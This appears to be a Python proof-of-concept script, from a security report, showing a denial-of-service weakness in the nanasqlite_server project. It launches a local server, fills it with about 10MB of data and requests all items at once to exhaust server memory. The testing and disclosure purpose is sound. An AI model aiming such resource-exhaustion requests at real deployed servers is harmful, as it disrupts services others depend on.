import asyncio
import os
import sys
from nanasqlite_server.client import RemoteNanaSQLite
from nanasqlite_server.cert_gen import generate_certificate
from nanasqlite_server.key_gen import generate_keys
import subprocess
import time
import signal

async def run_poc():
    print("--- PoC: DoS via Large Result Set ---")

    if not os.path.exists("cert.pem"): generate_certificate()
    if not os.path.exists("nana_public.pub"): generate_keys()

    port = 5556
    env = os.environ.copy()
    env["PYTHONPATH"] = "src"
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "nanasqlite_server.server", "--port", str(port)],
        env=env
    )

    time.sleep(2)

    client = RemoteNanaSQLite(host="127.0.0.1", port=port, verify_ssl=False)
    try:
        await client.connect()

        print("\n[Preparation] Inserting 10,000 entries...")
        batch = {f"key_{i}": "A" * 1000 for i in range(10000)}
        await client.batch_update(batch)

        print("\n[Attack] Requesting client.items()...")
        print("The server will try to serialize and send ~10MB+ in one response.")
        try:
            # サーバー側でのシリアライズによりメモリが急増する
            await client.items()
        except Exception as e:
            print(f"RESULT: [VULNERABLE] Request failed or server disconnected: {e}")

    finally:
        await client.close()
        server_proc.send_signal(signal.SIGINT)
        server_proc.wait()
        if os.path.exists("server_db.sqlite"): os.remove("server_db.sqlite")

if __name__ == "__main__":
    asyncio.run(run_poc())
